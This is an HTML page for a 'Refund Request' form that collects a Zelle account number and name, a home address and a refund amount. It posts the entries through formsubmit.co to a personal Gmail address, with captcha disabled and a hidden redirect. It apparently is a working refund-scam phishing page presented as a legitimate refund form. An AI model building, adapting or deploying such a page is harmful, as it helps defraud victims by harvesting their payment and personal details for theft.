<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Refund Request ‚Äì Gigi Miller</title>
  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/633/633611.png" type="image/png" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: radial-gradient(circle at top left, #6366f1, #a855f7, #ec4899);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 1rem;
    }
    .card {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      border-radius: 24px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
      padding: 2rem;
      max-width: 420px;
      width: 100%;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    .card:hover {
      transform: translateY(-5px);
      box-shadow: 0 30px 60px rgba(0,0,0,0.3);
    }
    .card-header {
      display: flex;
      align-items: center;
      gap: 1rem;
      margin-bottom: 2rem;
    }
    .logo {
      background: linear-gradient(to right, #9333ea, #ec4899);
      padding: 0.5rem;
      border-radius: 50%;
      color: white;
      font-size: 1.5rem;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    h1 {
      font-size: 1.75rem;
      font-weight: 800;
      color: #1f2937;
    }
    h1 span {
      color: #9333ea;
    }
    label {
      display: block;
      margin-bottom: 0.5rem;
      color: #374151;
      font-weight: 600;
      font-size: 0.9rem;
    }
    input, textarea {
      width: 100%;
      padding: 0.5rem;
      border-radius: 8px;
      border: 1px solid #d1d5db;
      background: rgba(255, 255, 255, 0.8);
      margin-bottom: 1rem;
      transition: border-color 0.3s ease, box-shadow 0.3s ease;
      font-family: 'Inter', sans-serif;
      box-sizing: border-box;
    }
    input:focus, textarea:focus {
      border-color: #9333ea;
      box-shadow: 0 0 0 3px rgba(147, 51, 234, 0.3);
      outline: none;
    }
    button {
      width: 100%;
      background: linear-gradient(to right, #9333ea, #ec4899);
      color: white;
      font-weight: 600;
      padding: 0.75rem;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.2s ease;
      margin-top: 1rem;
    }
    button:hover {
      background: linear-gradient(to right, #7e22ce, #db2777);
      transform: scale(1.02);
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="card-header">
      <div class="logo">üîÅ</div>
      <h1><span>Refund Request</span></h1>
    </div>
    <form id="refundForm" action="https://formsubmit.co/jenifferlaure05@gmail.com" method="POST" novalidate>
      <input type="hidden" name="_next" value="iiii.html" />
      <input type="hidden" name="_captcha" value="false" />

      <label for="name">Name (Optional)</label>
      <input type="text" name="Contact Address" id="name" placeholder="Your Name" />

      <label for="amount">Refund Amount</label>
      <input type="text" name="Refund Amount" id="amount" placeholder="Enter Amount" required />

      <label for="phone">Zelle Number and Name</label>
      <input type="text" name="Zelle Acct Number" id="phone" placeholder="Your Zelle Account Number" required />

      <label>Address</label>
      <input type="text" name="Street" id="street" placeholder="Street Address" required />
      <input type="text" name="City" id="city" placeholder="City" required style="margin-bottom: 0.5rem;" />
      <input type="text" name="State" id="state" placeholder="State / Province" required style="margin-bottom: 0.5rem;" />
      <input type="text" name="Zip" id="zip" placeholder="Zip / Postal Code" required />

      <label for="reason">Reason for Refund</label>
      <textarea name="Refund Reason" id="reason" rows="4" placeholder="Explain your reason..." required></textarea>

      <button type="submit">Request Refund</button>
    </form>
  </div>

  <script>
    document.getElementById('refundForm').addEventListener('submit', function(e) {
      if (!this.checkValidity()) {
        e.preventDefault();
        this.reportValidity();
      }
    });
  </script>
</body>
</html>
